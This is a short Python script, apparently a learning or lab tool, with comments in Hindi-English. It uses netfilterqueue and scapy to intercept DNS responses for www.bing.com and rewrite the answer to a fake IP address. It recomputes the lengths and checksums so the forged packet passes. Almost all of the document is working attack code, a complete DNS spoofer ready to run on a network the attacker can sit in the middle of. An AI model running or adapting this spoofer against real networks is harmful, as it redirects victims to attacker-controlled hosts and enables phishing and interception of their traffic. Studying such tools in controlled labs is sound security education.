import netfilterqueue
import scapy.all as scapy

# ==========================================
# PACKET MODIFICATION LOGIC
# ==========================================
def process_packet(packet):
    # Step 1: NetfilterQueue packet ko Scapy packet mein convert karo
    # (Payload matlab packet ke andar ka actual data)
    scapy_packet = scapy.IP(packet.get_payload())
    
    # Step 2: Check karo ki kya is packet mein DNS (Domain Name System) ki request hai?
    if scapy_packet.haslayer(scapy.DNSRR): # DNSRR = DNS Resource Record (Response)
        qname = scapy_packet[scapy.DNSQR].qname # Target website ka naam nikalna
        
        # Check if the target website is in our packet
        if b"www.bing.com" in qname:
            print("[+] Spoofing Target Website: ", qname.decode())
            
            # Step 3: Asli IP ki jagah apni fake IP daal do (Maan lo hamari IP 10.0.2.15 hai)
            answer = scapy.DNSRR(rrname=qname, rdata="10.0.2.15")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1
            
            # Step 4: Purane security checks (Length aur Checksum) delete kar do
            # Scapy inko apne aap naye data ke hisaab se recalculate kar lega
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum
            
            # Step 5: Naye modified Scapy packet ko wapas NetfilterQueue packet mein daalo
            packet.set_payload(bytes(scapy_packet))
            
    # Modified (ya normal) packet ko aage bhej do
    packet.accept()

# ==========================================
# MAIN EXECUTION
# ==========================================
print("[*] DNS Spoofer Toll Plaza is Active (Queue 0)...")
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)

try:
    queue.run()
except KeyboardInterrupt:
    print("\n[-] Shutting down...")
    queue.unbind()
